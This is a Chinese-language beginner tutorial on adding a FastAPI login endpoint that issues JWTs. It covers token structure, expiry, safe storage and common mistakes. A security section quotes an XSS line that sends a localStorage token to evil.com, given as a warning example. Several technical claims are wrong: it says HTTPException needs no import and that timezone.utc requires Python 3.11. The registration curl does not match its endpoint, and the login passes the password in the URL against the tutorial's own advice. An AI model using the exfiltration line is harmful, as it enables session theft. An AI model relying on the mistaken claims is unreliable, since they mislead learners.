# 15-用户登录 + JWT 认证

- 对应文档版本：首版教程
- 适用环境：Python 3.10+, FastAPI 0.100+, SQLAlchemy 2.0+, python-jose 3.3+, Windows/macOS/Linux
- 读者角色：后端初学者
- 预计耗时：新手 50 分钟 / 熟手 25 分钟
- 前置教程：[14-用户注册](./14-用户注册.md)（User 模型含 `password_hash`、`auth.py` 含 `pwd_context`）
- 可视化：有，[python_15_jwt_visual.html](python_15_jwt_visual.html)

---

## 一、目标与完成效果

**一句话目标**：实现登录接口——用户提交用户名和密码，服务端验证通过后签发 JWT token。从此，用户不需要每次请求都传密码，只要带着 token 就能证明"我是我"。

**完成后的可观测效果**：
- 你用 curl 向 `POST /users/login` 发送用户名和密码，返回一个 JWT token（一长串用点分隔的字符串）。
- 你把 token 贴到 [jwt.io](https://jwt.io) 解码，能看到 Header、Payload、Signature 三部分。
- 你修改 Payload 里的 `sub` 字段（比如把用户 ID 从 1 改成 2），再贴回去，jwt.io 显示 **Invalid Signature**——因为签名不匹配，篡改被检测到了。
- 你理解了 JWT 的"游乐园手环"比喻，"入园验票一次，之后只出示手环"。
- 你理解了为什么 token 要过期——"手环也有有效期"。

---

## 二、前置条件

| 序号 | 条件 | 验证命令 |
|------|------|----------|
| 1 | 已完成教程 14，`blog_backend/auth.py` 存在，内含 `pwd_context` | `findstr pwd_context blog_backend\auth.py`（Windows） |
| 2 | `blog_backend/models.py` 中 `User` 模型有 `password_hash` 字段 | `findstr password_hash blog_backend\models.py` |
| 3 | 数据库中至少有一个已注册用户（教程 14 注册的） | 用 curl 调用 `GET /users` 或查看 `blog.db` |
| 4 | 虚拟环境已激活，`passlib[bcrypt]` 已安装 | `pip show passlib` |
| 5 | 服务器正在运行 | 终端能看到 `Uvicorn running on http://127.0.0.1:8000` |

**一条命令确认前置满足**：

```powershell
python -c "from passlib.context import CryptContext; print('passlib OK')" && python -c "from blog_backend.auth import pwd_context; print('auth.py OK')"
```

如果两行都输出 OK，前置条件满足。

---

## 三、分步操作

### 步骤 1：问题——每次请求都传密码，行吗？

教程 14 我们实现了注册：用户提交用户名和密码，服务端把密码哈希后存进数据库。但接下来有一个关键问题：

**用户注册后，怎么证明"我是我"？**

最笨的办法：每次请求都带上用户名和密码。比如你要看自己的文章列表：

```bash
curl http://127.0.0.1:8000/my-posts?username=alice&password=123456
```

这有几个致命问题：

1. **密码在网络上裸奔**：每次请求都传密码明文，URL 会被记录在浏览器历史、服务器日志、代理服务器日志里——密码相当于公开了。
2. **服务端每次都要查数据库验证密码**：用户请求 100 次，服务端就要查 100 次 `users` 表、做 100 次哈希比对——徒增数据库压力。
3. **密码泄露 = 全盘沦陷**：攻击者截获一次请求，就拿到了用户的密码。他可以用这个密码登录、改密码、删文章——为所欲为。

**我们需要一种更好的方式：用户登录一次，服务端给他发一个"通行证"。之后他只要出示通行证，服务端就能认出他是谁，不需要再传密码。** 这个通行证，就是 **JWT（JSON Web Token）**。

> 📊 可视化演示见 [python_15_jwt_visual.html](python_15_jwt_visual.html)（步骤 1：从"每次都传密码"到"一次登录，多次使用 token"）

---

### 步骤 2：JWT 比喻——"游乐园手环"

JWT 的概念用一个比喻就能说清楚：

**你去游乐园玩：**

1. **入园时**：你在售票处买票，工作人员验票后，给你戴上一个**纸质手环**。
2. **玩项目时**：你想坐过山车，工作人员不看你的身份证，只看你手腕上的手环。手环在，就放行。
3. **手环过期**：手环是今天的日期，明天再来就失效了。你得重新买票、重新戴手环。
4. **手环防伪**：手环上有特殊图案和印章，你自己画一个没用——工作人员一眼就能认出假的。

**对照到 JWT：**

| 游乐园 | 后端系统 |
|--------|----------|
| 买票（身份证 + 钱） | 登录（用户名 + 密码） |
| 纸质手环 | **JWT token**（一串用点分隔的字符串） |
| 玩项目时出示手环 | 请求接口时在 HTTP Header 里带上 token |
| 手环是今天的日期 | token 有过期时间（默认 30 分钟） |
| 手环上的防伪印章 | token 的**签名（Signature）**——你篡改不了 |

**JWT 的核心价值**：**一次验证，多次使用。** 用户登录一次，拿到 token，之后在一段时间内，所有请求都只带 token 不带密码。服务端验证 token 的签名，就能确认"这个 token 是我签发的，没有被篡改，用户身份是 XXX"。

> 🤔 想多一点：为什么不用"服务端存一个 session"的传统方案？

传统方案（Session）是：用户登录后，服务端在内存或 Redis 里存一条记录 `session_id → user_id`，然后把 `session_id` 发给客户端。之后客户端每次请求带 `session_id`，服务端查表找到对应的 `user_id`。

**Session 方案的问题**：
- 服务端需要维护一张"谁登录了"的表，用户多了内存/Redis 压力大。
- 如果你的服务部署在多台机器上，Session 需要共享（用 Redis 等集中存储），架构变复杂。
- 服务端重启，所有 Session 全丢，所有用户都得重新登录。

**JWT 方案的优势**：
- 服务端**不需要存任何东西**（无状态）。token 本身就包含了用户信息（ID、过期时间），服务端只需要验证签名。
- 天然适合分布式——任何一台服务器都能独立验证 token，不需要共享 Session。
- 服务端重启不影响已登录用户——token 还在有效期内就还能用。

---

### 步骤 3：JWT 长什么样？——拆开看看里面的"三明治"

我们先用 [jwt.io](https://jwt.io) 直观感受一下 JWT 的结构。打开这个网站，你会看到默认已经填好了一个示例 token。它长这样（颜色是我加的）：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

注意看，它被**两个点**分成了**三部分**：

```
Header    .  Payload    .  Signature
eyJhbG...   eyJzdWI...   SflKxw...
```

这就是 JWT 的结构——**Header.Payload.Signature**，像一个三明治。

**把三部分分别用 Base64 解码看看**（jwt.io 右侧自动帮你解码了）：

**Part 1 — Header（头部）**：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg`：签名算法，`HS256` 表示用 HMAC-SHA256 算法。此术语需进附录。
- `typ`：类型，固定为 `JWT`。

**这就像手环的"材质说明"：用的是什么纸、什么墨水。**

**Part 2 — Payload（载荷）**：

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

- `sub`：subject（主题），通常放用户 ID。此术语需进附录。
- `name`：自定义字段，放用户名。
- `iat`：issued at（签发时间），Unix 时间戳格式。此术语需进附录。

**这就像手环上写的"持环人编号、姓名、入园时间"——这些信息是公开可见的，任何拿到手环的人都能看到。**

> ⚠️ **重要**：Payload 里的信息**不是加密的**，只是 Base64 编码。Base64 不是加密，是编码——任何人拿到 token 都能解码出 Payload 的内容。**所以绝对不要在 Payload 里放密码、身份证号、银行卡号等敏感信息！**

**Part 3 — Signature（签名）**：

签名是一串乱码，看起来像：`SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

**签名是怎么生成的？**

```
Signature = HMAC-SHA256(
    base64(Header) + "." + base64(Payload),
    secret_key
)
```

用大白话说：**把 Header 和 Payload 用点拼起来，然后用一把只有服务端知道的"密钥"（secret_key）对它们做一次 HMAC-SHA256 运算，得到签名。**

**这就像手环上的防伪印章——印章是用"游乐园的私章"盖的，你自己刻一个章盖上去，图案不一样，工作人员一眼就能看出是假的。**

**验证时**：服务端拿到 token，用同样的算法（Header + Payload + secret_key）重新算一遍签名，如果算出来的签名和 token 里的签名一致，说明 token 没有被篡改；如果不一致，说明有人改了 Payload（比如把 `sub` 从 1 改成 2 想冒充别人），但签名对不上——**篡改被检测到了**。

---

### 步骤 4：安装依赖

我们需要两个库：

1. **`python-jose[cryptography]`**：Python 的 JWT 库，负责签发和验证 token。后缀 `[cryptography]` 表示安装加密后端，性能更好。
2. **`passlib[bcrypt]`**：教程 14 已经装过了，用于密码哈希。本章登录接口需要用它验证密码。

打开终端，确保虚拟环境已激活，执行：

```bash
pip install "python-jose[cryptography]"
```

**验证安装**：

```bash
pip show python-jose
```

你应该看到类似输出：

```
Name: python-jose
Version: 3.3.0
Summary: JOSE implementation in Python
```

如果看到版本号，安装成功。

> 如果安装报错，试试不带 `[cryptography]` 后缀：`pip install python-jose`。没有 `cryptography` 后端也能用，只是性能稍差。

---

### 步骤 5：创建 JWT 工具函数——签发和验证 token

现在我们要在 `blog_backend/auth.py` 中添加 JWT 相关的工具函数。

**我在做什么？** 创建两个核心函数：
- `create_access_token(data, expires_delta)`：签发 token——"给游客戴上手环"。
- 后续会用到 `verify_token(token)`：验证 token——"检查手环是否伪造、是否过期"。

**打开 `blog_backend/auth.py`**，在文件末尾追加以下代码：

```python
# ========== JWT 相关 ==========

from datetime import datetime, timedelta, timezone
from jose import JWTError, jwt  # 此术语需进附录：JWTError

# === JWT 配置 ===
SECRET_KEY = "your-secret-key-change-in-production"  # 此术语需进附录：SECRET_KEY
ALGORITHM = "HS256"  # 签名算法
ACCESS_TOKEN_EXPIRE_MINUTES = 30  # token 默认 30 分钟过期


def create_access_token(data: dict, expires_delta: timedelta | None = None):
    """
    签发 JWT token。
    - data: 要放进 token payload 的数据，至少包含 "sub"（用户标识）
    - expires_delta: 自定义过期时间，不传则默认 30 分钟
    """
    to_encode = data.copy()  # 复制一份，不修改原始数据

    # 设置过期时间
    if expires_delta:
        expire = datetime.now(timezone.utc) + expires_delta
    else:
        expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)

    # 把过期时间加入 payload
    to_encode.update({"exp": expire})

    # 用密钥和算法签发 token
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt
```

**逐行解释**：

- `SECRET_KEY = "your-secret-key-change-in-production"`：**这是 JWT 签名用的密钥。** 它是整个认证体系的安全基石——谁拿到这把密钥，谁就能签发"合法"的 token。**生产环境必须换成随机长字符串，绝对不能提交到 Git！** 此术语需进附录。

- `ALGORITHM = "HS256"`：签名算法，和 Header 里的 `alg` 字段对应。`HS256` 是最常用的对称签名算法。

- `ACCESS_TOKEN_EXPIRE_MINUTES = 30`：token 默认 30 分钟过期。为什么是 30 分钟？后面会讲。

- `data.copy()`：复制一份传入的数据，避免修改原始字典。这是一个好习惯——你不知道调用方是否还会用这个字典。

- `datetime.now(timezone.utc)`：获取当前 UTC 时间。**始终用 UTC 时间**，避免时区混乱。`timezone.utc` 是 Python 3.11+ 的写法，如果你用的是 Python 3.10，用 `datetime.utcnow()` 代替。

- `to_encode.update({"exp": expire})`：把过期时间加入 payload。`exp` 是 JWT 标准字段，`python-jose` 会自动识别它并用于过期判断。

- `jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)`：用密钥和算法签发 token。这是 `python-jose` 的核心方法——把 payload "封印"成一个 token 字符串。

**验证方法**：

在 Python 交互环境中测试：

```bash
python
```

然后输入：

```python
from blog_backend.auth import create_access_token

# 签发一个 token
token = create_access_token(data={"sub": "1", "username": "alice"})
print(token)
```

你应该看到类似这样的输出：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImV4cCI6MTc0OTIxMjM0NX0.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

一长串用两个点分隔的字符串——这就是 JWT token！把它贴到 [jwt.io](https://jwt.io) 的左侧框里，右侧会自动解码出 Payload，你应该能看到 `sub`、`username`、`exp` 三个字段。

---

### 步骤 6：登录接口 —— `POST /users/login`

现在我们有签发 token 的能力了，接下来实现登录接口。

**登录的整体流程**：

```
用户发 POST /users/login
  ↓
服务端用用户名查数据库
  ↓
找到了？ → 没有 → 返回 401 "用户名或密码错误"
  ↓ 找到了
用 pwd_context.verify() 比对密码
  ↓
密码正确？ → 错误 → 返回 401 "用户名或密码错误"
  ↓ 正确
调用 create_access_token() 签发 JWT
  ↓
返回 token 给用户
```

**我在做什么？** 在 `main.py` 中添加 `POST /users/login` 接口。

**打开 `blog_backend/main.py`**，在文件末尾添加以下代码：

```python
# === 登录接口 ===
from fastapi import HTTPException
from blog_backend.auth import pwd_context, create_access_token

@app.post("/users/login")
def login(username: str, password: str, db: Session = Depends(get_db)):
    # 第 1 步：查用户
    user = db.query(models.User).filter(models.User.username == username).first()
    if user is None:
        raise HTTPException(
            status_code=401,
            detail="用户名或密码错误",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # 第 2 步：验证密码
    if not pwd_context.verify(password, user.password_hash):
        raise HTTPException(
            status_code=401,
            detail="用户名或密码错误",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # 第 3 步：签发 token
    access_token = create_access_token(
        data={"sub": str(user.id), "username": user.username}
    )

    # 第 4 步：返回 token
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user_id": user.id,
        "username": user.username,
    }
```

**逐行解释，每一步都很重要**：

**第 1 步：查用户**

```python
user = db.query(models.User).filter(models.User.username == username).first()
if user is None:
    raise HTTPException(status_code=401, detail="用户名或密码错误")
```

用 `username` 查数据库。如果找不到，返回 401。

**第 2 步：验证密码**

```python
if not pwd_context.verify(password, user.password_hash):
    raise HTTPException(status_code=401, detail="用户名或密码错误")
```

`pwd_context.verify(password, user.password_hash)` 是 `passlib` 提供的方法。它做两件事：
1. 把你提交的明文密码，用同样的哈希算法算一遍。
2. 比对计算结果和数据库里存的哈希值是否一致。

**注意：数据库里存的是哈希值，不是明文密码。** 服务端从来不需要"还原"密码——它只需要"比对"。这就是为什么即使数据库被盗，攻击者也拿不到用户密码。

> 🤔 想多一点：为什么两次错误都返回同样的提示"用户名或密码错误"？

**这是安全最佳实践。** 如果你分别返回"用户名不存在"和"密码错误"，攻击者就能用这个信息来"枚举"用户名——先试一堆用户名，看哪些返回"密码错误"（说明用户名存在），再对这些用户名暴力破解密码。

**统一返回"用户名或密码错误"**，攻击者无法区分是用户名不存在还是密码错误，无法进行用户名枚举攻击。

**第 3 步：签发 token**

```python
access_token = create_access_token(
    data={"sub": str(user.id), "username": user.username}
)
```

调用我们刚才写的 `create_access_token` 函数。`sub` 放用户 ID（转成字符串），`username` 放用户名——这些信息会被编码到 JWT 的 Payload 中。

**第 4 步：返回 token**

```python
return {
    "access_token": access_token,
    "token_type": "bearer",
    "user_id": user.id,
    "username": user.username,
}
```

返回一个 JSON 对象，包含 token 和用户基本信息。`token_type: "bearer"` 是 OAuth 2.0 规范的标准格式——意思是"持票人"：谁持有这个 token，谁就被认为是 token 对应的用户。

> ⚠️ `HTTPException` 是 FastAPI 内置的异常类，不需要手动导入——它已经在 `from fastapi import FastAPI` 时隐式可用了。如果你在代码里看到 `HTTPException` 未定义，在文件顶部加上 `from fastapi import HTTPException`。

---

### 步骤 7：用 curl 测试登录 → 去 jwt.io 解码

**我在做什么？** 用 curl 调用登录接口，拿到 token，然后去 jwt.io 亲眼看看 token 里面有什么。

**第 1 步：确认服务器在运行**

```bash
# 如果没启动，启动它
uvicorn blog_backend.main:app --reload
```

**第 2 步：确认你有一个已注册的用户**

如果你还没有注册过用户，先注册一个（教程 14 的内容）：

```bash
curl -X POST http://127.0.0.1:8000/users/register ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"alice\", \"password\": \"mypassword123\", \"nickname\": \"Alice\"}"
```

**第 3 步：登录，获取 token**

```bash
curl -X POST "http://127.0.0.1:8000/users/login?username=alice&password=mypassword123"
```

注意：这里用的是**查询参数**（`?username=alice&password=mypassword123`），而不是 JSON 请求体。这是因为 `login` 接口的参数声明为 `username: str, password: str`（查询参数），而不是 Pydantic 模型。用查询参数更简单——不需要记 `-H` 和 `-d` 的格式。

**预期输出**：

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImV4cCI6MTc0OTIxMjM0NX0.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "token_type": "bearer",
  "user_id": 1,
  "username": "alice"
}
```

**第 4 步：去 jwt.io 解码**

1. 复制 `access_token` 的值（那一长串字符串）。
2. 打开 [jwt.io](https://jwt.io)。
3. 粘贴到左侧的 **Encoded** 框里。
4. 右侧 **Decoded** 区域会自动解码，你看到：

**HEADER**：
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**PAYLOAD**：
```json
{
  "sub": "1",
  "username": "alice",
  "exp": 1749212345
}
```

- `sub: "1"`：用户 ID 是 1。
- `username: "alice"`：用户名。
- `exp: 1749212345`：过期时间（Unix 时间戳）。点一下这个数字，jwt.io 会自动帮你转成可读的日期时间。

**第 5 步：试试篡改 token**

这是最直观的体验——让你理解为什么签名很重要。

1. 在 jwt.io 右侧 Payload 区域，把 `"sub": "1"` 改成 `"sub": "2"`。
2. 看左侧 Encoded 框——token 变成了新的字符串，但签名部分也变了（因为 jwt.io 用空白密钥重新签名了）。
3. 现在把左侧 Encoded 框里的 token **只改 Payload 部分**（中间那段），签名部分**不动**。
4. jwt.io 会显示 **"Invalid Signature"**（红色提示）。

**这就是 JWT 的防篡改机制**：你改了 Payload，签名就对不上了，服务端验证时就能发现。

---

### 步骤 8：token 过期机制——为什么手环也有有效期？

我们的 `create_access_token` 默认 30 分钟过期。为什么需要过期？

**原因 1：token 泄露后的"止损"**

假设你的 token 被攻击者偷走了。如果 token 永不过期，攻击者就能**永久**用你的身份操作——删文章、改密码、发评论——和你本人一模一样。

但如果 token 30 分钟后过期，攻击者最多只能"冒充"你 30 分钟。30 分钟后，token 失效，他需要重新偷一个——而你可能已经发现了异常，换密码了。

**可以把 token 过期时间理解为"手环的有效期"**：游乐园的日票手环只在当天有效，第二天就作废了。即使你的手环掉了被别人捡到，他也只能玩今天剩下的时间，明天就不能用了。

**原因 2：无法"撤销"单个 token**

JWT 是无状态的——服务端不存谁登录了。这意味着**一旦 token 签发出去，服务端没有办法主动"撤销"它**（除非你额外维护一个黑名单，但那就失去了 JWT 无状态的优势）。

假设你发现账户被盗了，改了密码。但如果 token 永不过期，攻击者拿到的旧 token 依然有效——因为服务端验证 token 只看签名，不查数据库里的"密码有没有改过"。

**设置过期时间，就是一种"被动撤销"机制**：不需要服务端主动撤销，时间一到，token 自动失效。

**30 分钟是一个平衡点**：
- 太短（比如 5 分钟）：用户每 5 分钟就要重新登录一次，体验极差。
- 太长（比如 7 天）：token 泄露后的风险窗口太大。
- 30 分钟：对大多数应用来说，这是一个合理的折中值。

> 🤔 想多一点：还有"刷新 token"（Refresh Token）机制

有些系统会同时签发两个 token：
- **Access Token**（短期，比如 30 分钟）：用来访问 API。
- **Refresh Token**（长期，比如 7 天）：用来换新的 Access Token。

这样即使 Access Token 泄露，攻击者也只能用 30 分钟。而 Refresh Token 从来不直接发给 API，只在专门的"刷新接口"使用，泄露风险更低。**这属于进阶话题，本教程暂不展开。**

**验证 token 是否过期**：

你可以手动测试。在 Python 中：

```python
from blog_backend.auth import create_access_token
from datetime import timedelta

# 签发一个 1 秒后过期的 token
token = create_access_token(data={"sub": "1"}, expires_delta=timedelta(seconds=1))
print(token)

# 等 2 秒后，尝试用 python-jose 解码
import time
time.sleep(2)

from jose import jwt, JWTError
from blog_backend.auth import SECRET_KEY, ALGORITHM

try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    print("Token 有效:", payload)
except JWTError as e:
    print("Token 无效:", str(e))
    # 输出：Token 无效: Signature has expired.
```

---

### 步骤 9：❌ 常见错误 —— token 泄露的后果

**❌ 错误 1：把 token 打印到日志**

```python
# 错误！token 会出现在日志文件里
print(f"用户 {username} 登录成功，token: {access_token}")
```

**后果**：日志文件通常没有严格的访问控制，任何有权限读日志的人都能拿到 token——运维、开发、甚至攻击者（如果日志被泄露）。

✅ 正确做法：**永远不要打印或记录 token 全文**。最多打印 token 的前几位作为标识：

```python
print(f"用户 {username} 登录成功，token 前缀: {access_token[:10]}...")
```

**❌ 错误 2：把 token 放在 URL 里传递**

```bash
# 错误！token 在 URL 里，会被各种地方记录
curl "http://127.0.0.1:8000/posts?token=eyJhbGciOi..."
```

**后果**：URL 会被记录在浏览器历史、服务器日志、代理日志、Nginx 日志中——token 相当于公开了。

✅ 正确做法：**token 放在 HTTP Header 的 `Authorization` 字段中**：

```bash
curl http://127.0.0.1:8000/posts -H "Authorization: Bearer eyJhbGciOi..."
```

**❌ 错误 3：把 SECRET_KEY 写在代码里提交到 Git**

```python
# 错误！密钥会被提交到 Git 历史，永远删不掉
SECRET_KEY = "my-hardcoded-secret-key-123"
```

**后果**：任何能看到你仓库的人（包括未来的离职员工）都能用这个密钥签发"合法"的 token，冒充任何用户。

✅ 正确做法：**用环境变量**：

```python
import os
SECRET_KEY = os.getenv("SECRET_KEY", "fallback-for-dev-only")
```

然后在启动服务器时设置环境变量：

```bash
# Windows PowerShell
$env:SECRET_KEY = "a-very-long-random-string-here"
uvicorn blog_backend.main:app --reload
```

**生成随机密钥**：

```bash
python -c "import secrets; print(secrets.token_urlsafe(32))"
```

这会输出一个 43 个字符的随机字符串，比如 `dGg7kH3xPq9vLm2nRf4sYb8wCz1tAe5uJp6oIi0yUxQ`——用它做 `SECRET_KEY`。

---

### 步骤 10：✅ 安全注意 —— token 存哪里？

**❌ 错误：存在 localStorage**

前端代码中：

```javascript
// 错误！XSS 攻击可以直接读取 localStorage
localStorage.setItem("token", access_token);
```

**为什么不行？** localStorage 可以被任何 JavaScript 代码读取。如果你的网站被注入了恶意脚本（XSS 攻击），攻击者一行代码就能偷走所有用户的 token：

```javascript
// 攻击者注入的代码
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"));
```

**✅ 正确做法：生产环境用 httpOnly cookie**

服务端在返回 token 时，设置一个 `httpOnly` 的 cookie：

```python
from fastapi.responses import JSONResponse

@app.post("/users/login")
def login(username: str, password: str, db: Session = Depends(get_db)):
    # ... 验证逻辑 ...
    access_token = create_access_token(data={"sub": str(user.id)})

    response = JSONResponse(content={
        "message": "登录成功",
        "user_id": user.id,
        "username": user.username,
    })
    # 把 token 放在 httpOnly cookie 中
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,   # JavaScript 无法读取
        secure=True,     # 只在 HTTPS 下传输
        samesite="lax",  # 防 CSRF 攻击
        max_age=1800,    # 30 分钟过期（和 token 一致）
    )
    return response
```

**`httpOnly` cookie 的特点**：
- JavaScript 代码**完全无法读取**（`document.cookie` 看不到它）。
- 浏览器会自动在每个请求的 `Cookie` 头里带上它，服务端可以读取。
- 即使攻击者注入了 XSS 脚本，也无法偷走 token。

**但本教程阶段**：我们还在用 curl 和手动测试，httpOnly cookie 不便于演示。**所以接下来的教程中，我们暂时用"手动在 HTTP Header 里传 token"的方式**——但不代表这是生产环境的最佳实践。等你学到前端部分时，再切换到 httpOnly cookie。

---

### 🤔 想多一点：我拿到的 token 真的能"证明我是我"吗？

回顾一下整个流程：

1. 你提交用户名和密码 → 服务端验证通过 → 说明你**确实知道**密码。
2. 服务端签发 token，`sub` 字段写入你的用户 ID。
3. 服务端用只有自己知道的 `SECRET_KEY` 对 token 签名。
4. 下次你带 token 来请求 → 服务端重新验证签名 → 签名正确 → 说明这个 token **确实是我之前签发的**，`sub` 字段里的用户 ID **确实是我亲自验证过的**。

**这个信任链条是**：
- 服务端信任自己的 `SECRET_KEY`（只有自己知道，没泄露）。
- 服务端验证签名 → 签名正确 → token 没有被篡改。
- `sub` 里的用户 ID 是服务端亲自验证密码后写入的 → 这个用户 ID 可信。
- 所以：**持有这个 token 的人，就是 `sub` 对应的用户。**

**整个链条的安全性取决于**：
1. `SECRET_KEY` 不泄露。
2. 用户的密码不泄露。
3. token 本身不泄露（不用 HTTP 明文传输，不存 localStorage，不打印到日志）。

---

## 四、完整代码清单

### `blog_backend/auth.py`（在教程 14 基础上追加 JWT 部分）

```python
from passlib.context import CryptContext

# ========== 密码哈希 ==========
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")


def get_password_hash(password: str) -> str:
    """把明文密码变成哈希值"""
    return pwd_context.hash(password)


def verify_password(plain_password: str, hashed_password: str) -> bool:
    """验证明文密码和哈希值是否匹配"""
    return pwd_context.verify(plain_password, hashed_password)


# ========== JWT 相关 ==========

from datetime import datetime, timedelta, timezone
from jose import JWTError, jwt

# === JWT 配置 ===
SECRET_KEY = "your-secret-key-change-in-production"  # 生产环境必须换！
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30


def create_access_token(data: dict, expires_delta: timedelta | None = None):
    """
    签发 JWT token。
    - data: 要放进 payload 的数据，至少包含 "sub"（用户标识）
    - expires_delta: 自定义过期时间，不传则默认 30 分钟
    """
    to_encode = data.copy()

    if expires_delta:
        expire = datetime.now(timezone.utc) + expires_delta
    else:
        expire = datetime.now(timezone.utc) + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)

    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt
```

### `blog_backend/main.py`（在之前版本基础上追加登录接口）

```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.responses import JSONResponse
from sqlalchemy.orm import Session
from blog_backend.schemas import BlogCreate
from blog_backend.database import engine, get_db, Base
from blog_backend import models
from blog_backend.auth import pwd_context, create_access_token

app = FastAPI()

# === 自动建表 ===
Base.metadata.create_all(bind=engine)


@app.get("/")
def read_root():
    return {"message": "Hello World"}


# === 获取全部文章 ===
@app.get("/posts")
def get_all_posts(db: Session = Depends(get_db)):
    posts = db.query(models.Post).all()
    return posts


# === 创建文章 ===
@app.post("/posts", status_code=201)
def create_post(blog: BlogCreate, db: Session = Depends(get_db)):
    new_post = models.Post(
        title=blog.title,
        content=blog.content,
        published=blog.published,
        user_id=1,  # 暂时硬编码，后续教程会用 token 中的用户 ID
    )
    db.add(new_post)
    db.commit()
    db.refresh(new_post)
    return new_post


# === 获取单篇文章 ===
@app.get("/posts/{post_id}")
def get_post(post_id: int, db: Session = Depends(get_db)):
    post = db.query(models.Post).filter(models.Post.id == post_id).first()
    if post is None:
        return JSONResponse(
            status_code=404,
            content={"error": f"文章 #{post_id} 不存在"}
        )
    return post


# === 更新文章 ===
@app.put("/posts/{post_id}")
def update_post(post_id: int, blog: BlogCreate, db: Session = Depends(get_db)):
    post = db.query(models.Post).filter(models.Post.id == post_id).first()
    if post is None:
        return JSONResponse(
            status_code=404,
            content={"error": f"文章 #{post_id} 不存在，无法更新"}
        )
    post.title = blog.title
    post.content = blog.content
    post.published = blog.published
    db.commit()
    db.refresh(post)
    return post


# === 删除文章 ===
@app.delete("/posts/{post_id}")
def delete_post(post_id: int, db: Session = Depends(get_db)):
    post = db.query(models.Post).filter(models.Post.id == post_id).first()
    if post is None:
        return JSONResponse(
            status_code=404,
            content={"error": f"文章 #{post_id} 不存在，无法删除"}
        )
    title = post.title
    db.delete(post)
    db.commit()
    return {"message": f"文章 #{post_id}「{title}」已删除"}


# ========== 用户相关接口 ==========

# === 用户注册（教程 14） ===
@app.post("/users/register", status_code=201)
def register(username: str, password: str, nickname: str, db: Session = Depends(get_db)):
    # 检查用户名是否已存在
    existing = db.query(models.User).filter(models.User.username == username).first()
    if existing:
        raise HTTPException(
            status_code=400,
            detail=f"用户名 '{username}' 已被注册"
        )

    # 创建新用户
    new_user = models.User(
        username=username,
        password_hash=pwd_context.hash(password),
        nickname=nickname,
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)

    return {
        "message": "注册成功",
        "user_id": new_user.id,
        "username": new_user.username,
        "nickname": new_user.nickname,
    }


# === 用户登录（本章新增） ===
@app.post("/users/login")
def login(username: str, password: str, db: Session = Depends(get_db)):
    # 第 1 步：查用户
    user = db.query(models.User).filter(models.User.username == username).first()
    if user is None:
        raise HTTPException(
            status_code=401,
            detail="用户名或密码错误",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # 第 2 步：验证密码
    if not pwd_context.verify(password, user.password_hash):
        raise HTTPException(
            status_code=401,
            detail="用户名或密码错误",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # 第 3 步：签发 token
    access_token = create_access_token(
        data={"sub": str(user.id), "username": user.username}
    )

    # 第 4 步：返回 token
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user_id": user.id,
        "username": user.username,
    }
```

---

## 五、验证方法

在终端中依次执行以下命令，全部通过则本章完成：

```bash
# 1. 确认服务器在运行
# (如果没启动：uvicorn blog_backend.main:app --reload)

# 2. 用错误密码登录 → 应返回 401
curl -X POST "http://127.0.0.1:8000/users/login?username=alice&password=wrongpassword"

# 3. 用正确密码登录 → 应返回 token
curl -X POST "http://127.0.0.1:8000/users/login?username=alice&password=mypassword123"

# 4. 复制返回的 access_token 值，打开 https://jwt.io
#    粘贴到左侧 Encoded 框 → 右侧应解码出 sub、username、exp

# 5. 在 jwt.io 右侧 Payload 中把 "sub" 改成 "2"
#    左侧 Encoded 框的签名应变为 Invalid Signature（红色）

# 6. 用不存在的用户名登录 → 应返回 401（和错误密码提示一样）
curl -X POST "http://127.0.0.1:8000/users/login?username=nobody&password=whatever"
```

全部通过？恭喜你——你现在理解了 JWT 认证的全部核心概念，能够签发和验证 token 了！

---

## 六、术语附录

| 术语 | 英文 | 通俗解释 | 本章出现位置 |
|------|------|----------|-------------|
| JWT | JSON Web Token | "游乐园手环"——登录后服务端给你的一个凭证，之后每次请求出示它就行，不用再传密码。由三部分组成：Header.Payload.Signature。 | 步骤 2 |
| token | — | 令牌、凭证。本章中 JWT 就是一种 token。拿到了 token 就相当于拿到了"我是 XXX 用户"的证明。 | 步骤 2 |
| Header | — | JWT 的第一部分，描述签名算法和 token 类型。就像手环上写的"材质说明"。 | 步骤 3 |
| Payload | — | JWT 的第二部分，存放实际数据（用户 ID、用户名、过期时间等）。**是 Base64 编码，不是加密，任何人都能解码看到内容。** | 步骤 3 |
